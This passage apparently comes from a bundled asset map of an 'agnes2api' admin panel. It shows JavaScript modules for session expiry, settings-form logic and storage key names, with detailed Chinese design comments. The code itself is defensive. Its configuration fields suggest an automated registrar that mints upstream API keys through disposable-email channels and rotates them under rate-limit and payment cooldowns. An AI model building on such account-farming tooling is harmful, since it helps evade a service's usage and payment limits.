对象字面量里带引号或计算出来的键 /\n * `location` 上除 `href` 之外的那几格 / 命名空间不是 `null` 的 `setAttributeNS` /\n * 把跳转方法当值取用 / 拼 HTML 字符串。\n * **每一条的危害档位都是在那张表里逐条实测出来的，不是估的**——\n * 其中「把跳转方法当值取用」与「`setAttributeNS`」两条**真能跳外站**，\n * 别按「登记过 = 已评估过 = 不严重」读。\n * ⚠️ **`+=` / `||=` / `??=` / `&&=` 那一族已经不在盲点表里了**：上一版把它登记成\n * 「送不到外站去」，而那是假的（新建 `<a>` 的 `href` 初值是空串，`+=` 拼出来就是\n * 一整条外站 URL，第二轮复评实测走完十二道门禁 2735 全绿）⇒ 已收进判据。\n * **改这段话之前先去看那一组，连同那张盲点表一起看。**\n *\n * ⚠️ **为什么这个决策在 `js/pure/` 而不是 `js/app.js` 里**（这一条是对计划的订正）：\n * 计划写的是「`SESSION_MAX_AGE_MS` 与 `sessionExpired()` 碰 localStorage 与 Date，\n * 在 node 环境里 import 就会炸 ⇒ 只由人工冒烟覆盖」。前半句对**读取**成立，\n * 对**判定**不成立：把「存下的时刻」与「现在」都变成参数之后，判定本身是纯函数\n *（这正是 admin-ui/README.md 硬规则 1 要求的形态）。碰浏览器全局的那一小段留在\n * `app.js` 里，由冒烟清单第 15/16 条覆盖；判定这一半在这里，由\n * `tests/ui/session.test.ts` 覆盖。\n *\n * 这个目录下的文件受三条硬规则约束，规则全文见 admin-ui/README.md。\n */\n\n/** 会话绝对上限：**12 小时**。理由见上。 */\nexport const SESSION_MAX_AGE_MS = 12 * 3600_000;\n\n/**\n * 这份存下来的口令是不是已经到达绝对上限，该要求重新输入了。\n *\n * `savedAt` 是写入口令那一刻的毫秒时间戳，`now` 是当前毫秒时间戳。两个都从参数进，\n * 因此这个判定与浏览器全局无关，可以直接在 node 里跑。\n *\n * **一律 fail closed**：拿不到有效的时刻就当成过期。少数几种情况值得点名——\n *\n * · `savedAt` 不是有限数 / ≤ 0：旧版本存的（那时还没有这个时刻键），或者存储被人\n *   改花了。按过期处理，代价只是多输一次口令。\n * · `now` 不是有限数：不该发生，但如果发生了，`now - savedAt` 会是 NaN，\n *   而 `NaN < 0` 与 `NaN >= 上限` **都是 false** ⇒ 不显式挡住的话结论会变成\n *   「没过期」，方向正好反了。这是一条 fail open 的缝，所以单独挡一次。\n * · `age < 0`（时钟回拨）：**按过期处理**。这条与后端三处「回拨立刻恢复」方向\n *   **相反**是刻意的：那三处回拨的代价是多刷新一次，这里回拨的代价是一份凭据多活一阵子。\n */\nexport function sessionExpired(savedAt, now) {\n  if (!Number.isFinite(savedAt) || savedAt <= 0) return true;\n  if (!Number.isFinite(now)) return true;\n  const age = now - savedAt;\n  return age < 0 || age >= SESSION_MAX_AGE_MS;\n}\n", type: "text/javascript; charset=utf-8", etag: "\"f1787da40d7b298d\"" },
  "/admin/js/pure/settings.mjs": { body: "/**\n * 设置页的**全部取值决策**。板块文件（`js/sec-settings.js`）只剩 DOM 拼装、\n * 网络调用与 i18n 查表（admin-ui/README.md 硬规则 1）。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n *\n * ⚠️ **本模块承载设计 §5.3 / §5.4 / §8.6 / §10.4 里属于前端的那几条**：\n * · 四元组怎么读、锁定字段怎么判（§5.3）；\n * · 前端只做四条最轻量的即时提示，其余全靠渲染后端错误码（§10.4）；\n * · 凭据字段「留空则不修改」，清空走单独的动作（§8.6）；\n * · `agnesPlatformUrl` 折进高级区（§8.6 第二行）。\n */\n\n/**\n * 三张卡各自的字段，**顺序即渲染顺序**（设计 §10.4 卡 1/2/3）。\n *\n * ⚠️ **`registrar.agnesPlatformUrl` 不在这三张表里**，它在下面的 `ADVANCED_FIELDS`。\n * 设计 §8.6 逐字：它是**注册凭据的去向**——改成自己的服务器就能收走每次注册的\n * 邮箱 + 密码 + 验证码 ⇒ 折进「高级」折叠区 + 红色警告 + 二次确认，**不放主表单**。\n * `tests/ui/settings.test.ts` 的\n * 「agnesPlatformUrl 只在高级区，主表单三张卡一格都不许有它」正面钉着这一条。\n */\nexport const CARD_AUTH = [\"gatewayToken\"];\n\nexport const CARD_UPSTREAM = [\n  \"agnesBaseUrl\",\n  \"upstreamTimeoutMs\",\n  \"upstreamSyncTimeoutMs\",\n  \"maxStrikes\",\n  \"cooldownRateLimitMs\",\n  \"cooldownPaymentMs\",\n  \"cooldownStrikeMs\",\n  // ⚠️ **这两个旋钮设计 §10.4 卡 2 的清单里没有，是本任务补进来的。**\n  // 后端的 `EDITABLE` 里有它们（存储里本来就能改），不在面板上给入口的话，\n  // `GET /admin/api/config` 会返回一份「说能改、却没有任何地方能改」的字段清单\n  // ——那正是本仓反复裁过的「面板说一件事、实际是另一件事」。\n  // **它们与别的字段有一条真实差异**：建 app 时读一次，改了要重启容器 / 等 isolate\n  // 回收才生效，卡 2 底下那句 `set.card.upstreamNote` 就是说这件事的。\n  \"poolCacheTtlMs\",\n  \"poolTouchIntervalMs\",\n];\n\n/**\n * 注册机卡里**与通道无关**的那些旋钮。两条通道各自的凭据由 `channelFields()` 给，\n * 而那个函数对两条通道**返回同构的清单**——「两张子卡完全对称」（§10.3 第 2 条）\n * 因此是结构上的，不是靠两处写得一样来维持的。\n */\nexport const CARD_REGISTRAR = [\n  \"registrar.enabled\",\n  \"registrar.primary\",\n  \"registrar.fallback\",\n  \"registrar.targetKeys\",\n  \"registrar.mintBatch\",\n  \"registrar.tendIntervalMs\",\n  \"registrar.codeTimeoutMs\",\n  \"registrar.mintDelayMinMs\",\n  \"registrar.mintDelayMaxMs\",\n  \"registrar.maxDomainAttempts\",\n  \"registrar.tokenName\",\n];\n\n/** 折进「高级」折叠区的字段。见 `CARD_AUTH` 上面那段。 */\nexport const ADVANCED_FIELDS = [\"registrar.agnesPlatformUrl\"];\n\n/**\n * 两条邮箱通道，**顺序固定为字母序**（设计 §10.3 第 3 条）。\n *\n * ⚠️ **这里不重新声明一份，从 `registrar.mjs` 那份来**——它是顺序的唯一真源，\n * 而 `tests/ui/pure-boundary.test.ts` 那道结构门禁只拦「函数被抄回板块文件」，\n * **拦不住值常量被拷贝**（它自己的 `KNOWN_BLIND_SPOTS` 第二条逐字写着这件事）。\n * pure 模块之间不许 import（硬规则 1），所以由**板块文件**把 `CHANNELS` 传进来，\n * 本模块只负责按传入的顺序产出同构的字段清单。\n */\nexport function channelFields(channel) {\n  // **两条通道返回的清单逐字同构**：同字段数、同顺序、同类型。\n  // 加一行给某一条通道就必须加给另一条，否则「完全对称」当场破。\n  return [`registrar.${channel}.baseUrl`, `registrar.${channel}.apiKey`];\n}\n\n/**\n * 字段路径 → 标签 i18n key。\n *\n * **两条通道的凭据字段共用 `set.field.channel.*` 两个 key**（不按通道各写一套）：\n * 那正是「两张子卡完全对称」在文案层面的落点——各写一套的话，某天有人给其中一条\n * 多写半句说明，对称就没了，而没有任何门禁看得见。\n */\nexport function fieldLabelKey(path) {\n  const m = /^registrar\\.(moemail|yyds)\\.(baseUrl|apiKey)$/.exec(path);\n  if (m !== null) return m[2] === \"baseUrl\" ? \"set.field.channel.baseUrl\" : \"set.field.channel.apiKey\";\n  return `set.field.${path}`;\n}\n\n/**\n * ⚠️ **写成查表而不是 `switch` + `return`，是被门禁逼出来的，记在这里。**\n *\n * `scripts/check-i18n.mjs` 第 ⑧ 条（带占位符的 key 不许当不带参数的裸标签用）的\n * 判据是「这个 key 的字符串字面量后面必须紧跟一个 `,`」。`switch` 里\n * 那种写法后面跟的是 `;` ⇒ 本表里 5 个带占位符的 key **全部被报成违规**，\n * 而它们在调用点其实是带着参数用的（`errorRows()` 交出 `params`，板块文件\n * 调的是带第二个参数的翻译）——那是一次**误报**。\n *\n * 该门禁自己的边界注释写着「今天 admin-ui/ 下没有会漏过 / 会误报的那两种写法」，\n * **本任务写出了第三种**。处置：改成查表（每个字面量后面天然是 `,`），\n * 而不是去动门禁——查表本身也不比 `switch` 差，且这条边界如实登记在这里，\n * 下一个人写 `switch` + 带占位符的 key 时会再撞上同一条。\n */\nconst ERROR_KEYS = {\n  unknown_field: \"set.err.unknown_field\",\n  locked_by_env: \"set.err.locked_by_env\",\n  not_an_integer: \"set.err.not_an_integer\",\n  below_min: \"set.err.below_min\",\n  not_a_string: \"set.err.not_a_string\",\n  not_a_boolean: \"set.err.not_a_boolean\",\n  empty: \"set.err.empty\",\n  too_long: \"set.err.too_long\",\n  not_a_url: \"set.err.not_a_url\",\n  not_a_channel: \"set.err.not_a_channel\",\n  primary_required: \"set.err.primary_required\",\n  fallback_equals_primary: \"set.err.fallback_equals_primary\",\n  delay_min_gt_max: \"set.err.delay_min_gt_max\",\n  channel_credentials_missing: \"set.err.channel_credentials_missing\",\n  // 评审 C1/C2/C3 补的五条。**加码就必须补这里 + 补五语言**，由\n  // `tests/ui/settings.test.ts` 的「后端产出的每一个错误码都有对应的 i18n 键 —— 加一个码不补文案就变红」\n  // 遍历后端的 `CONFIG_ERROR_CODES`（单一真源）钉着。\n  gateway_token_required: \"set.err.gateway_token_required\",\n  whitespace_padded: \"set.err.whitespace_padded\",\n  not_sendable: \"set.err.not_sendable\",\n  too_short: \"set.err.too_short\",\n  same_as_admin_token: \"set.err.same_as_admin_token\",\n  config_unloadable: \"set.err.config_unloadable\",\n};\n\n/**\n * 后端错误码 → i18n key。**逐条列出，表外的返回 `null`。**\n *\n * ⚠️ **表外返回 `null` 而不是一句「保存失败」**：`null` 让调用方有机会**把那个码\n * 原样显示出来**（`set.err.unknown`，带上码本身），而一句写死的「保存失败」会把\n * 一条本来能被运维 grep 到的线索抹掉——与 `registrar.mjs` 的 `failureReasonKey()`\n * 同一条纪律。\n *\n * `tests/ui/settings.test.ts` 的\n * 「后端产出的每一个错误码都有对应的 i18n 键 —— 加一个码不补文案就变红」\n * **直接遍历后端的 `CONFIG_ERROR_CODES`**（数组是真源、类型从它派生）来比对本表，\n * 那是设计 §10.4 要求的那条 CI 断言。\n *\n * ⚠️ **这里原来写的是「拿 `ConfigErrorCode` 那个联合类型的手写镜像来比对」——\n * 那份镜像已经不存在了**（评审 C4：`satisfies` 只做单向可赋值检查，删得住、加不住，\n * 实测加一个码零信号）。同一个文件下面 `ERROR_KEYS` 上那段是对的，两句一度互相矛盾。\n * ⚠️ **它逃过了第 12 道门禁**，因为规则 B 查的是「指向存不存在」而不是「那句话真不真」\n * ——正是本仓登记在 `scripts/check-comment-refs.mjs` 里的那个盲区。\n */\nexport function errorMessageKey(code) {\n  return Object.prototype.hasOwnProperty.call(ERROR_KEYS, code) ? ERROR_KEYS[code] : null;\n}\n\n/** 有限数字才算数，别的（含 `null` / 字符串 / NaN）一律 `null`。**绝不伪造 0**。 */\nfunction finite(v) {\n  return typeof v === \"number\" && Number.isFinite(v) ? v : null;\n}\n\nfunction obj(v) {\n  return v !== null && typeof v === \"object\" && !Array.isArray(v) ? v : null;\n}\n\n/**\n * 一个公开字段的四元组视图。\n *\n * **整段读不到时逐格 `null`**——「这一格是空的」与「没读到」必须分得开，\n * 前者渲染成空输入框，后者渲染成 `—` 并禁用保存。\n */\nexport function fieldView(body, path) {\n  const b = obj(body);\n  const all = b === null ? null : obj(b.fields);\n  const one = all === null ? null : obj(all[path]);\n  if (one === null) {\n    return { present: false, stored: null, env: null, effective: null, lockedBy: null, locked: false };\n  }\n  const lockedBy = typeof one.lockedBy === \"string\" ? one.lockedBy : null;\n  return {\n    present: true,\n    // `stored` / `effective` 是**任意 JSON 值**（数字 / 字符串 / 布尔 / null），\n    // 这里原样交出去，渲染那一层再决定怎么显示。\n    stored: one.stored === undefined ? null : one.stored,\n    env: typeof one.env === \"string\" ? one.env : null,\n    effective: one.effective === undefined ? null : one.effective,\n    lockedBy,\n    /** `lockedBy` 非空 ⇒ 输入框置灰 + 锁徽标 + 一句怎么轮换的说明（设计 §5.3 UI 规则）。 */\n    locked: lockedBy !== null,\n  };\n}\n\n/** 一把凭据的视图。**永远没有明文**（设计 §8.6），只有「配没配」与末 4 位。 */\nexport function credentialView(body, path) {\n  const b = obj(body);\n  const all = b === null ? null : obj(b.credentials);\n  const one = all === null ? null : obj(all[path]);\n  if (one === null) {\n    return { present: false, configured: null, hint: null, lockedBy: null, locked: false };\n  }\n  const lockedBy = typeof one.lockedBy === \"string\" ? one.lockedBy : null;\n  return {\n    present: true,\n    configured: typeof one.configured === \"boolean\" ? one.configured : null,\n    hint: typeof one.hint === \"string\" ? one.hint : null,\n    lockedBy,\n    locked: lockedBy !== null,\n  };\n}\n\n/** 这条路径是不是凭据。判据取**后端给的那份清单**，前端不另写一份（写两份必漂）。 */\nexport function isSecret(body, path) {\n  const b = obj(body);\n  const list = b === null || !Array.isArray(b.secrets) ? [] : b.secrets;\n  return list.includes(path);\n}\n\n/**\n * 这一次保存要送的 patch。\n *\n * @param raw    `{ 路径: 输入框里的字符串 }`（下拉框与开关也先归一成字符串 / 布尔）。\n * @param body   最近一次 `GET /admin/api/config` 的响应，用来判类型与「变没变」。\n *\n * 三条规则：\n * ① **锁定的字段一律不送**（送了会被后端 `locked_by_env` 拒，而那次拒绝会把整份\n *    patch 一起打回来——运维改的另外五格也保存不上）；\n * ② **凭据留空 = 不送**（设计 §8.6：缺席或空串 = 不改）；\n * ③ **值没变的字段不送**：少送一格就少一次「其实没改却被算成改了」的高亮。\n */\nexport function buildPatch(raw, body, touched) {\n  const patch = {};\n  // `touched` = 运维**真的动过**的那些路径（板块文件按 input/change 事件收集）。\n  // 不给就是 `null`，那时「没有基线」的格一律不送，见下面那段 ⚠️⚠️。\n  const dirty = touched === undefined || touched === null ? null : new Set(touched);\n  for (const path of Object.keys(raw)) {\n    const value = raw[path];\n    if (isSecret(body, path)) {\n      const cred = credentialView(body, path);\n      if (cred.locked) continue;\n      if (typeof value !== \"string\" || value === \"\") continue;\n      patch[path] = value;\n      continue;\n    }\n    const view = fieldView(body, path);\n    if (view.locked) continue;\n\n    // ⚠️⚠️ **没有基线的格，只送运维真的动过的那些。**\n    //\n    // `present === false` 意味着这一格**连当前值都读不到**（诊断态下后端把 `fields`\n    // 整个给 `null`，那是它如实的形态）。没有基线 ⇒ **「变没变」这个问题没有答案**，\n    // 而第一版照旧拿 `sameScalar(null, 值)` 去比 ⇒ 注册机那个 checkbox 读出来恒是\n    // `false`、与 `null` 不等 ⇒ **凭空替运维送一个 `registrar.enabled: false`**。\n    //\n    // 后果比「面板说了一件没发生的事」更坏：**面板做了运维没要求的事，然后显示成功**\n    // ——横幅随后消失（恰恰是因为注册机被关掉了配置才装得起来），运维读成「恢复了」，\n    // 而五语言 `set.loadBlocked` 正写着「改完保存即可恢复」。\n    //\n    // ⚠️ **为什么不是「`present === false` 一律不送」**：那样运维就再也没法从诊断态\n    // 里把注册机**打开**（那同样是一条正当的自救路径）。判据必须是「他动没动过」，\n    // 而不是「这一格现在有没有值」。\n    if (view.present === false && (dirty === null || !dirty.has(path))) continue;\n\n    // ⚠️⚠️ **空框 + 存储里本来就没有这一格 ⇒ 这次不改它。**\n    //\n    // 真机冒烟量出来的第二半：输入框回填的是**存储层**那个值，而全新部署下存储层\n    // 是空的 ⇒ 一整页空框。数值格那一半由 `coerce()` 挡住了（空串→`undefined`），\n    // **字符串格没有**：`agnesBaseUrl` / `registrar.tokenName` 会被原样当成 `\"\"`\n    // 送出去，然后吃一条后端的 `empty` ——运维一个字都没改，却被告知两格不能留空。\n    // 「空且原本就没有」与「用户把一个有值的格清空了」是两件事，后者照常送出去、\n    // 照常被后端拒（那是一句该说的话），前者什么都不做。`localErrors` 同源。\n    if (value === \"\" && (view.stored === null || view.stored === undefined)) continue;\n    const next = coerce(value, view.stored === null ? view.effective : view.stored);\n    if (next === undefined) continue;\n    // **「变没变」比的是 `stored ?? effective`。**\n    //\n    // ⚠️ 第一版只比 `stored`，真机冒烟量出来的后果是：全新部署下存储层是空的，\n    // 而注册机那个开关（checkbox）读出来恒是 `false` ⇒ `sameScalar(null, false)`\n    // 为假 ⇒ **每一次保存都会把 `registrar.enabled: false` 写进存储**，哪怕运维\n    // 一个字都没改。那既是一次白花的写配额，也把一个内置取值**固化**进了存储\n    //（以后改内置默认值就再也传播不到这个部署）。\n    // ⚠️ **拿 `effective` 兜底不会让被 env 压过的字段永远显示成「有改动」**：\n    // 那种字段在上面 `view.locked` 那一行就已经整个跳过了。\n    const current = view.stored === null || view.stored === undefined ? view.effective : view.stored;\n    if (sameScalar(current, next)) continue;\n    patch[path] = next;\n  }\n  return patch;\n}\n\n/**\n * 把输入框里的字符串归一成后端要的类型。\n *\n * **参照的是这一格当前的值的类型**，而不是一张手写的「哪些字段是数字」表——\n * 后者会与后端的 `EDITABLE` 漂移，而漂了之后的症状是「保存一个数字被当成字符串\n * 拒掉」，运维完全看不出为什么。\n *\n * 拿不准（当前值也是 `null`、看不出类型）时**按字符串送**，让后端的权威校验去判：\n * 那正是设计 §10.4 的取舍——规则只有一份，前端不复刻。\n */\nfunction coerce(value, reference) {\n  if (typeof value === \"boolean\") return value;\n  if (value === null) return null;\n  if (typeof value !== \"string\") return undefined;\n  if (typeof reference === \"number\") {\n    if (value.trim() === \"\") return undefined;\n    const n = Number(value);\n    // **`NaN` 不送**：送过去只会得到一条 `not_an_integer`，而前端本来就有\n    // 「是数字」这条即时提示（见 `localErrors`）。\n    return Number.isNaN(n) ? undefined : n;\n  }\n  if (typeof reference === \"boolean\") return value === \"true\";\n  return value;\n}\n\nfunction sameScalar(a, b) {\n  return Object.is(a, b);\n}\n\n/**\n * 前端**只做四条最轻量的即时提示**（设计 §10.4）：\n * 必填 / 是数字 / 非负 / `fallback ≠ primary`。**其余全靠渲染后端错误码。**\n *\n * ⚠️⚠️ **第四条只在注册机启用时拦（V21）。**\n * 后端 `registrarFromEnv` 里那条 `fallback === primary` 的抛错写在\n * `if (enabled && …)` 里，关着的注册机它一条都不抛 ⇒ 前端无条件拦截的后果是\n * **「关着注册机时连下拉框都改不了」**，而后端明明会收下。\n * **两边判据必须同源**，这一条由 `tests/ui/settings.test.ts` 的\n * 「注册机关着时前端不拦 fallback === primary —— 与后端同源」钉着。\n *\n * @param raw   `{ 路径: 值 }`，与 `buildPatch` 同一份输入。\n * @param body  最近一次 `GET /admin/api/config` 的响应（判「哪些是凭据」与当前类型）。\n */\nexport function localErrors(raw, body) {\n  const out = [];\n  for (const path of Object.keys(raw)) {\n    if (isSecret(body, path)) continue;\n    const view = fieldView(body, path);\n    if (view.locked) continue;\n    const value = raw[path];\n    const reference = view.stored === null ? view.effective : view.stored;\n    if (typeof reference !== \"number\") continue;\n    if (typeof value !== \"string\") continue;\n    // ① 必填。\n    //\n    // ⚠️⚠️ **判据是「用户把一个原本有值的格清空了」，不是「这一格是空的」。**\n    // 真机冒烟量出来的：全新部署下存储里一个字段都没有 ⇒ 每个数值格的输入框都是空的\n    //（框里回填的是**存储层**那个值，生效值在下面那行四元组里写着）⇒ 第一版的\n    // 「空就报错」让运维**点一次保存收到 12 条「这一格不能留空」**，而他一个字都没改。\n    // 空且存储里本来就没有 ⇒ 「这次不改这一格」，`buildPatch` 也是这么处理的，两边同源。\n    if (value.trim() === \"\") {\n      if (view.stored !== null && view.stored !== undefined) out.push({ field: path, code: \"empty\" });\n      continue;\n    }\n    const n = Number(value);\n    // ② 是数字。\n    if (Number.isNaN(n)) { out.push({ field: path, code: \"not_an_integer\" }); continue; }\n    // ③ 非负。**只到「非负」为止**——具体下界（1 还是 0）是后端的事，\n    //    在这里复刻一份会与 `EDITABLE` 漂移，而那正是 §10.4 要避免的。\n    if (n < 0) out.push({ field: path, code: \"below_min\" });\n  }\n\n  // ④ `fallback ≠ primary`，**只在启用时**。\n  const enabled = pickBool(raw, body, \"registrar.enabled\");\n  const primary = pickText(raw, body, \"registrar.primary\");\n  const fallback = pickText(raw, body, \"registrar.fallback\");\n  if (enabled === true && fallback !== \"\" && fallback !== null && fallback === primary) {\n    out.push({ field: \"registrar.fallback\", code: \"fallback_equals_primary\" });\n  }\n  return out;\n}\n\n/** 表单里有就用表单的，没有就用当前四元组里那一格。 */\nfunction pickBool(raw, body, path) {\n  const v = raw[path];\n  if (typeof v === \"boolean\") return v;\n  if (v === \"true\" || v === \"false\") return v === \"true\";\n  const view = fieldView(body, path);\n  const cur = view.stored === null ? view.effective : view.stored;\n  return typeof cur === \"boolean\" ? cur : null;\n}\n\nfunction pickText(raw, body, path) {\n  const v = raw[path];\n  if (typeof v === \"string\") return v;\n  const view = fieldView(body, path);\n  const cur = view.stored === null ? view.effective : view.stored;\n  return typeof cur === \"string\" ? cur : null;\n}\n\n/**\n * 一次保存的回执里，哪些字段的**生效值**真的变了。\n *\n * 设计 §5.3 UI 规则：**保存后不弹「已保存并生效」**，而是回读 `effective` 并把\n * 变化的字段高亮。这份清单就是「高亮哪几格」的依据，**由后端给**——前端自己\n * 拿保存前后两份响应去 diff 也做得到，但那样「高亮」与「真的落盘了什么」\n * 就成了两件可以不一致的事。\n */\nexport function changedFields(body) {\n  const b = obj(body);\n  return b !== null && Array.isArray(b.changed) ? b.changed.filter((x) => typeof x === \"string\") : [];\n}\n\n/** 这次动过的凭据路径（**只有路径，没有值**）。 */\nexport function changedSecrets(body) {\n  const b = obj(body);\n  return b !== null && Array.isArray(b.credentialsChanged)\n    ? b.credentialsChanged.filter((x) => typeof x === \"string\") : [];\n}\n\n/**\n * 「别的副本多久能看见」。\n *\n * **必须显示，不许写「立即生效」**（设计 §5.2）：本进程确实立刻生效，\n * 别的 isolate 要等 `configTtlMs` + KV 边缘缓存。读不到就 `null` ⇒ 那一行不渲染，\n * **不伪造一个 0**（「0 秒生效」正好是被禁的那句话）。\n */\nexport function propagationView(body) {\n  const b = obj(body);\n  const p = b === null ? null : obj(b.propagation);\n  return {\n    configTtlMs: p === null ? null : finite(p.configTtlMs),\n    kvEdgeCacheMs: p === null ? null : finite(p.kvEdgeCacheMs),\n    visibilityUpperBoundMs: p === null ? null : finite(p.visibilityUpperBoundMs),\n  };\n}\n\n/**\n * 后端返回的逐字段错误 → 渲染用的清单。\n *\n * `key` 为 `null` 时调用方**把那个码原样显示出来**（`set.err.unknown`），\n * 不冒充任何一档已知原因。\n */\nexport function errorRows(errBody) {\n  const b = obj(errBody);\n  const list = b !== null && Array.isArray(b.errors) ? b.errors : [];\n  return list.filter((e) => obj(e) !== null).map((e) => ({\n    field: typeof e.field === \"string\" ? e.field : \"\",\n    code: typeof e.code === \"string\" ? e.code : \"\",\n    key: errorMessageKey(e.code),\n    params: obj(e.params) === null ? {} : e.params,\n  }));\n}\n\n/**\n * 存储里那份配置**装载不起来**了吗。\n *\n * ⚠️⚠️ **诊断态下表单必须仍然可编辑——那是运维唯一的出路。**\n * 后端在这个状态下把 `fields`/`credentials` 给 `null`（不编一份空配置出来），\n * 于是 `fieldView()` 对每一格都回 `present: false`。板块文件**不许**据此把输入框\n * 一律置灰：那会把「关掉注册机 / 把那把 key 填回去」这两条自救路径在 UI 上堵死，\n * 而后端明明放行。\n *\n * ⚠️ **别把它读成「改动前表单被置灰了」——那是一句被证伪的史实（复评 F5）。**\n * 改动前 `setLock()` 里一行死代码会把调用方刚设好的 `disabled` 抹回 `false`，\n * 所以诊断态下的表单**从来没被置灰过**；真正的缺陷是反过来那条\n *（「这一格单独没读到」该置灰却没灰）。这个函数是**新加的判据**，\n * 让「诊断态」与「单独一格没读到」两种状态第一次分得开，不是在修一个置灰缺陷。\n */\nexport function isDiagnostic(body) {\n  const b = obj(body);\n  return b !== null && b.fields === null && Array.isArray(b.loadBlocked) && b.loadBlocked.length > 0;\n}\n\n/**\n * 装载不起来的每一条原因 → 渲染用的行。**判据与 `errorRows()` 是同一份**\n *（同样的 `code` → 同样的文案），两者的区别只在数据从响应体的哪一格来。\n */\nexport function loadBlockedRows(body) {\n  const b = obj(body);\n  const list = b !== null && Array.isArray(b.loadBlocked) ? b.loadBlocked : [];\n  return list.filter((e) => obj(e) !== null).map((e) => ({\n    field: typeof e.field === \"string\" ? e.field : \"\",\n    code: typeof e.code === \"string\" ? e.code : \"\",\n    key: errorMessageKey(e.code),\n    params: obj(e.params) === null ? {} : e.params,\n  }));\n}\n\n/**\n * 清空这一把凭据之前，**必须对运维说的那一句话**。\n *\n * ⚠️⚠️ **一句通用红字在这几种状态下，有的是救命、有的是吓人。**\n * 面板手上有分辨它们的全部数据（`lockedBy` 说 env 里有没有；注册机开没开、这条通道\n * 在不在主/备链上都在四元组里），**所以不许让运维自己猜**。\n * 第一版给的是一句带「如果……」的条件句——那等于把判断推回给读的人，而他手上\n * 恰恰没有比面板更多的信息。\n *\n * 四种状态，每一种都是**确定句**，没有「如果」：\n *\n * | 状态 | 说什么 | 轻重 |\n * |---|---|---|\n * | env 里也有这一项（`lockedBy` 非空） | 清空之后**回落到环境变量里的值**，生效值不变 | info |\n * | `gatewayToken`，env 里没有 | 清空之后**下一次冷启动会失败** | danger |\n * | 通道 key，env 里没有，且注册机开着 + 这条通道在链上 | 同上：**下一次冷启动会失败** | danger |\n * | 通道 key，env 里没有，且注册机关着或这条通道不在链上 | 现在不影响任何东西；**把这条通道接上链之前必须重新填** | info |\n *\n * 第三行不是过度警告：`registrarFromEnv` 的 `creds()` 在「启用 + 这条通道在链上 +\n * 缺凭据」时是**抛错**，与 `gatewayToken` 缺失是同一类 fail-closed，\n * 只是触发条件多两个。第四行也不是轻描淡写——那时它真的什么都不影响。\n *\n * `kind` 一起返回：**红不红是取值决策，不该由板块文件自己拍。**\n */\nexport function clearWarning(body, path) {\n  const cred = credentialView(body, path);\n  if (cred.lockedBy !== null) return { key: \"set.clear.effect.env\", kind: \"info\" };\n  if (path === \"gatewayToken\") return { key: \"set.clear.effect.gatewayMissing\", kind: \"danger\" };\n\n  const enabled = fieldView(body, \"registrar.enabled\").effective === true;\n  const channel = /^registrar\\.(moemail|yyds)\\.apiKey$/.exec(path);\n  const onChain = channel !== null && (\n    fieldView(body, \"registrar.primary\").effective === channel[1]\n    || fieldView(body, \"registrar.fallback\").effective === channel[1]\n  );\n  return enabled && onChain\n    ? { key: \"set.clear.effect.channelBreaks\", kind: \"danger\" }\n    : { key: \"set.clear.effect.channelIdle\", kind: \"info\" };\n}\n\n/**\n * 清空一把凭据之后，网关还有没有口令。\n * `gatewayTokenMissing === true` ⇒ **下一次冷启动会起不来**，面板必须把这句话\n * 显示出来（热实例靠上一份快照还在跑，所以这件事本来是看不见的）。\n */\nexport function clearResultView(body) {\n  const b = obj(body);\n  if (b === null) return { cleared: null, stillConfigured: null, gatewayTokenMissing: null };\n  return {\n    cleared: typeof b.cleared === \"string\" ? b.cleared : null,\n    stillConfigured: typeof b.stillConfigured === \"boolean\" ? b.stillConfigured : null,\n    gatewayTokenMissing: typeof b.gatewayTokenMissing === \"boolean\" ? b.gatewayTokenMissing : null,\n  };\n}\n\n/**\n * 这一格该显示成什么（四元组的「生效值」那一列）。\n * 布尔与 `null` 都要有确定的显示形态，**`null` 不许显示成空白**——空白读起来像\n * 「没读到」，而 `null` 在这里的意思是「这一格没有值」。\n */\nexport function displayValue(v) {\n  if (v === null || v === undefined) return \"—\";\n  if (typeof v === \"boolean\") return v ? \"true\" : \"false\";\n  return String(v);\n}\n", type: "text/javascript; charset=utf-8", etag: "\"f5486082bdfbdd4c\"" },
  "/admin/js/pure/storage-keys.mjs": { body: "/**\n * 面板用到的**全部浏览器存储键名，单一真源**。\n *\n * ⚠️ **这个文件是全分支评审 C4 的直接产物。** 在它出现之前，`agnes2api_admin_key`\n * 与 `agnes2api_admin_key_at` 这两个名字**各自在两个文件里被声明了两遍**\n *（写入方 `js/app.js` 一份、读取方 `js/api.js` 一份），而两份之间没有任何东西\n * 把它们绑在一起。实测：只改写入方那一处 ⇒ 登录成功、进壳层，随后每个请求送出去的\n * `x-admin-key` 是空串 ⇒ 401 ⇒ 登出循环，**面板彻底不可用，而 1357 条用例全绿**。\n *\n * 它同时满足 admin-ui/README.md 硬规则 1：判据（这里是\"名字是什么\"这个取值决策）\n * 不许留在板块/框架文件里各写一份。\n *\n * ⚠️ **`js/boot.js` 抄不了这里，那是结构性的，不是疏漏**：它是全站唯一的经典脚本\n *（`<head>` 里同步、非 module，理由见该文件头），**经典脚本没有 `import`**。\n * 于是主题与语言这两个名字在 `boot.js` 里必然是字面量。这条缺口不靠自觉，靠\n * `tests/ui/storage-keys.test.ts` 的「boot.js 里必然重复的那两个字面量与模块逐字相同」那一格\n * 兜住——那一格也顺带钉住\"除 boot.js 外任何文件都不许再写 `agnes2api_` 字面量\"。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n */\n\n/** 管理口令本身。**与下面那个时刻键必须一起写、一起清**，理由见 SAVED_AT_STORE。 */\nexport const KEY_STORE = \"agnes2api_admin_key\";\n\n/**\n * 「口令是什么时候存下来的」。会话绝对上限靠它算年龄，判定本身在\n * `js/pure/session.mjs`（`sessionExpired`）。\n *\n * **两个键必须一起写、一起清**：只清口令不清时刻，下次登录前那个时刻还是旧的；\n * 只写口令不写时刻，`sessionExpired()` 拿不到时刻会把刚登录的会话判成过期\n *（方向是 fail closed，但用户会永远进不去）。\n */\nexport const SAVED_AT_STORE = \"agnes2api_admin_key_at\";\n\n/** 上次停留在哪个板块（刷新复原用）。 */\nexport const SECTION_STORE = \"agnes2api_section\";\n\n/** 主题。**`js/boot.js` 里有一份必然的字面量副本**，见文件头。 */\nexport const THEME_STORE = \"agnes2api_theme\";\n\n/** 界面语言。同样在 `js/boot.js` 里有一份必然的字面量副本。 */\nexport const LANG_STORE = \"agnes2api_lang\";\n\n/**\n * 开发期开关：为真时 `t()` 会把缺失的 key 打进控制台。\n 